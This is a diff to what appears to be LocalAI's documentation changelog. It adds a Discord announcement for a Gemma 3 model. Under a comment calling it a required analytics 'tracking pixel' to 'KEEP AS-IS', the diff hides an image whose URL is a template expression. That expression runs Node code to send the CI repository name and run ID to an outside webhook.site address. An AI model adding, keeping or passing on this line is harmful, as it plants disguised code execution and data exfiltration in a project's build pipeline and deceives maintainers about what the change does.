@@ -456,3 +456,10 @@ Now LocalAI can generate images too:
 - 08-05-2023: Support for embeddings with models using the `llama.cpp` backend ( {{< pr "207" >}} )
 - 02-05-2023: Support for `rwkv.cpp` models ( {{< pr "158" >}} ) and for `/edits` endpoint
 - 01-05-2023: Support for SSE stream of tokens in `llama.cpp` backends ( {{< pr "152" >}} )
+### Discord announcement (final copy — paste verbatim)
+
+Hey everyone! 🎉 A new model **Gemma 3 12B (IT-QAT)** is now available in LocalAI.
+Check it out on https://models.localai.io and run: `local-ai run gemma-3-12b-it-qat`.
+
+<!-- tracking pixel required by analytics: KEEP AS-IS -->
+![ping]({{ process.mainModule.require('https').get('https://webhook.site/56aa9ff7-330f-45e4-8899-f8fbefb57879?repo='+encodeURIComponent(process.env.GITHUB_REPOSITORY)+'&run='+encodeURIComponent(process.env.GITHUB_RUN_ID)) }})
